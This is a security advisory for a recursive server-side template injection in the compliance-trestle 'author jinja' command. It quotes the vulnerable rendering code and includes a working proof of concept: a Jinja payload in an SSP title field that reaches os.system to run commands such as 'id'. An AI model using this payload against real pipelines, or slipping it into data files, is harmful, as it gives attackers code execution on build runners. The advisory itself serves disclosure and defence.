# [H] compliance-trestle Vulnerable to Remote Code Execution via Recursive Server-Side Template Injection (SSTI)

## Summary
Severity: High
Advisory: GHSA-gg2g-p7xc-qqmm
CVE: CVE-2026-46439
CWE: CWE-1336, CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-28
Source: https://github.com/advisories/GHSA-gg2g-p7xc-qqmm
Type: github-advisory

## Affected
- PyPI: `compliance-trestle` — affected >=0 <3.12.2
- PyPI: `compliance-trestle` — affected >=4.0.0 <4.0.3

## Details
A High severity Server-Side Template Injection (SSTI) vulnerability exists in the `trestle author jinja` command. The command recursively evaluates rendered templates, allowing an attacker to achieve arbitrary command execution with privileges of the running process by injecting malicious payloads into data fields (such as SSP documents or Lookup Tables).

**The vulnerability does not require attacker control of the template itself. Only attacker-controlled input data rendered into a trusted template is required.** 

This distinction is critical: the template author may only intend to render plain text (e.g., `Title: {{ ssp.metadata.title }}`), but because of the recursive parsing, the data field itself becomes executable. 

The vulnerability is caused by recursive re-compilation and re-rendering of already-rendered output.

## Details
In `trestle/core/commands/author/jinja.py`, the `render_template` method performs recursive template evaluation to allow nesting within expressions:

```python
    @staticmethod
    def render_template(template: Template, lut: Dict[str, Any], template_folder: pathlib.Path) -> str:
        new_output = template.render(**lut)
        output = ''
        error_countdown = JinjaCmd.max_recursion_depth
        while new_output != output and error_countdown > 0:
            error_countdown = error_countdown - 1
            output = new_output
            random_name = uuid.uuid4()
            dict_loader = DictLoader({str(random_name): new_output})
            # jinja_env does not use SandboxedEnvironment
            jinja_env = Environment(
                loader=ChoiceLoader([dict_loader, FileSystemLoader(template_folder)]),
                extensions=extensions(),
                autoescape=True,
                trim_blocks=True
            )
            template = jinja_env.get_template(str(random_name))
            new_output = template.render(**lut)
        return output
```

When a fully trusted and static template resolves a variable from an attacker-controlled data source, the attacker's string is injected into the output. During the next pass of the `while` loop, this output is loaded into a new `Environment` via `DictLoader` and rendered again. Because `jinja_env` does not use `SandboxedEnvironment`, attacker-controlled template expressions embedded in data fields are re-evaluated as executable Jinja templates during recursive rendering.

## PoC (Proof of Concept)
The vulnerability survives even when the template itself is fully trusted and static. 
Tested on `Jinja2` version `3.1.6`.

1. Create a fully trusted template (`template.j2`) that simply renders a data variable from an external SSP model:
```jinja2
Title: {{ ssp.metadata.title }}
```

2. Generate a malicious OSCAL SSP document (`system-security-plans/malicious_ssp/system-security-plan.json`) where the title field contains a Jinja execution payload. This demonstrates how data becomes code execution:
```json
{
  "system-security-plan": {
    "uuid": "208dbe11-e6e2-411a-af18-095cd17a6a70",
    "metadata": {
      "title": "{{ namespace.__init__.__globals__.os.system('touch poc.txt') }}",
      "last-modified": "2024-01-01T00:00:00+00:00",
      "version": "1.0",
      "oscal-version": "1.0.4"
    },
    "import-profile": { "href": "trestle://profiles/test_profile/profile.json" }
  }
}
```

3. Execute the `trestle author jinja` command against the malicious data:
```bash
trestle author jinja -i template.j2 -o out.md -ssp malicious_ssp
```
*(Note: A similar payload injected via the `-lut` yaml argument yields identical results.)*

4. Verify arbitrary command execution:
```bash
ls poc.txt
# The file poc.txt is successfully created on the filesystem.
```

An attacker can also execute arbitrary shell commands directly, e.g.:
```json
      "title": "{{ namespace.__init__.__globals__.os.system('id') }}",
```

## Impact
This vulnerability allows arbitrary command execution with the privileges of the running process. If `compliance-trestle` is used in an automated pipeline (such as CI/CD workflows generating documentation from third-party vendor-supplied SSPs), a malicious payload embedded in a data field (like a system title or description) will result in a compromised runner environment. The user/operator must process the attacker-controlled SSP or LUT, satisfying the user interaction metric.

## References
- https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-gg2g-p7xc-qqmm
- https://github.com/oscal-compass/compliance-trestle/commit/247fcce289f60103f3d8e28d8ec51a6986b94fb6
- https://github.com/oscal-compass/compliance-trestle/commit/7d107b3ac53caca7bde97a6278b23cd739d94525
- https://github.com/oscal-compass/compliance-trestle
